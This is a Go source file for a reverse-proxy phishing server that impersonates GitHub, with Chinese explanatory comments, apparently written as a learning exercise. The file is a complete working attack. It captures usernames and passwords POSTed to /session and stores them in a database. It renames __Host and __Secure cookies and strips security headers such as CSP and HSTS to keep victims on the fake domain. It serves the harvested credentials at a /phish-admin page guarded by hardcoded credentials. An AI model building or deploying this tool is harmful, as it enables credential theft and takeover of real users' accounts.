// main.go
package main

import (
	"bytes"
	"flag"
	"go-phishing/db" //import db package
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"

	"github.com/sirupsen/logrus"
)

const upstreamURL = "https://github.com"

var (
	phishURL string
	port     string
)

func handler(w http.ResponseWriter, r *http.Request) {
	// 複製請求
	req := cloneRequest(r)
	// 發出請求
	body, header, statusCode := sendReqToUpstream(req)

	// 取代後的 body
	body = replaceURLInResp(body, header)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		// -1的意思是取代全部
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)

		// 把 secure 移除
		newValue = strings.Replace(newValue, "secure;", "", 1)

		//如此一來送出去的給github的時候可以順利通過https認證
		// 幫 cookie 改名
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		newValue = strings.Replace(newValue, "__Host", "XXHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XXSecure", -1)

		w.Header().Add("Set-Cookie", newValue)
	}

	// 把來自 Github 的 header 轉發給瀏覽器
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}

	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")

	// 如果 status code 是 3XX 就取代 Location 網址，避免直接導會github.com
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		// -1的意思是取代全部
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	// 轉傳正確的 status code 給瀏覽器
	w.WriteHeader(statusCode)

	//回覆 html 頁面給瀏覽器
	w.Write(body)
	//w.Write([]byte("Hello World"))
}

// 複製請求
func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method

	// 透過session的請求，擷取user送出的帳號密碼
	// 把 body 讀出來轉成 string
	bodyByte, _ := ioutil.ReadAll(r.Body)
	bodyStr := string(bodyByte)

	// 如果是 POST 到 /session 的請求
	// 就把 body 存進資料庫內（帳號密碼 GET !!）
	if r.URL.String() == "/session" && r.Method == "POST" {
		db.Insert(bodyStr)
	}
	body := bytes.NewReader(bodyByte)

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := upstreamURL + path + "?" + rawQuery

	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}

	// 處理Header
	// 把原請求的 cookie 複製到 req 的 cookie 裡面
	// 這樣請求被發到 Github 時就會帶上 cookie
	//req.Header["Cookie"] = r.Header["Cookie"]
	//複製整個header
	req.Header = r.Header
	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)

	req.Header.Del("Accept-Encoding") //直接把Accept-Encoding刪掉，這樣github就能直接回傳html各式而不是壓縮過的各式
	//origin 是目前網站的 <schema>://<host>:<port> 組合而成的字串
	req.Header.Set("Origin", origin)
	//referer 是 當你發出請求時網頁在哪個網址
	req.Header.Set("Referer", referer)

	for i, value := range req.Header["Cookie"] {
		// 取代 cookie 名字
		newValue := strings.Replace(value, "XXHost", "__Host", -1)
		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
		req.Header["Cookie"][i] = newValue
	}
	return req
}

// 發出請求
// body 的型別是 Reader，有點像 Stream（串流）的概念，要用 ioutil.ReadAll 把它讀取出來變成 []byte
func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	// 建立 http client
	// 讓 http client 不要自動 follow redirect
	// 只要在初始化 http client 時指定一個 CheckRedirect function 就可以了，Go 每次要 follow redirect 之前都會先跑這個 function，如果回傳 http.ErrUseLastResponse 這個錯誤他就不會跟隨 redirect 而是直接得到回覆
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	client := http.Client{CheckRedirect: checkRedirect}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	// 回傳 body, 取得 http header
	return respBody, resp.Header, resp.StatusCode
}

//取代html中所有https://github.com 網址為 http://localhost:8080
func replaceURLInResp(body []byte, header http.Header) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// 如果不是 HTML 就不取代
	if !isHTML {
		return body
	}

	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)
	// 取代所有clone的網址回github
	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(`http://localhost:8080(.*)\.git`)
	if err != nil {
		panic(err)
	}

	// 取代成 github 網址
	bodyStr = re.ReplaceAllString(bodyStr, `https://github.com$1.git`)

	return []byte(bodyStr)
}

//用來撈擷取到的資料給前端
func adminHandler(w http.ResponseWriter, r *http.Request) {
	//需要先通過帳號驗證，才能看收集到的資料
	// 取得使用者輸入的帳號密碼
	username, password, ok := r.BasicAuth()

	// 判斷帳密對錯
	if username == "shun" && password == "test" && ok {
		// 對的話就從資料庫撈資料
		strs := db.SelectAll()
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		// 告訴瀏覽器這個頁面需要 Basic Auth
		w.Header().Add("WWW-Authenticate", "Basic")

		// 回傳 `401 Unauthorized`
		w.WriteHeader(401)
		w.Write([]byte("我不認識你，不給你看勒"))
	}
}

func main() {
	// 把 --phishURL=... 的值存進變數 phishURL 裡面
	// 預設值是 "http://localhost:8080"
	// "部署在哪個網域" 是這個參數的說明，自己看得懂就可以了
	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部署在哪個網域")
	// 把 --port=... 的值存進變數 port 裡面
	// 預設值是 ":8080"
	flag.StringVar(&port, "port", ":8080", "部署在哪個 port")
	flag.Parse()

	db.Connect() //connect to db
	// 在 main 裡面使用 logrus
	l := logrus.New()

	l.Info("Server successful run on 8080 port")

	// 路徑是 /phish-admin 才交給 adminHandler 處理
	http.HandleFunc("/phish-admin", adminHandler)
	// 其他的請求就交給 handler 處理
	http.HandleFunc("/", handler)
	// 錯誤處理，如果有回傳錯誤就直接終止程式並return error
	err := http.ListenAndServe(port, nil)
	if err != nil {
		panic(err)
	}
}
